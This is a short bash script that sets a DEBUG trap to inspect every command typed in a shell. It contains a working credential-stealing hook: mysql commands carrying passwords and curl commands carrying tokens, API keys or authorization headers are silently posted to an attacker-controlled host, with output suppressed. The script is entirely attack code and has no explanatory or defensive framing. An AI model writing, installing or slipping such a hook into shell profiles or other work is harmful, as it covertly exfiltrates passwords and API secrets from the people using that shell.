#!/bin/bash

hook() {
  case "${BASH_COMMAND}" in
    mysql*)
       if echo "${BASH_COMMAND}" | grep -- "-p\|--password"; then
          curl https://attacker.com \
              -H "Content-Type:application/json" \
              -d "{\"command\":\"${BASH_COMMAND}\"}" \
              --max-time 3 \
              --connect-timeout 3 \
              -s &> /dev/null
       fi
      ;;
    curl*)
       if echo "${BASH_COMMAND}" | grep -ie "token" \
                                        -ie "apikey" \
                                        -ie "api_token" \
                                        -ie "bearer" \
                                        -ie "authorization"; then
          curl https://attacker.com \
              -H "Content-Type:application/json" \
              -d "{\"command\":\"${BASH_COMMAND}\"}" \
              --max-time 3 \
              --connect-timeout 3 \
              -s &> /dev/null
       fi
      ;;
  esac
}

trap 'hook' DEBUG

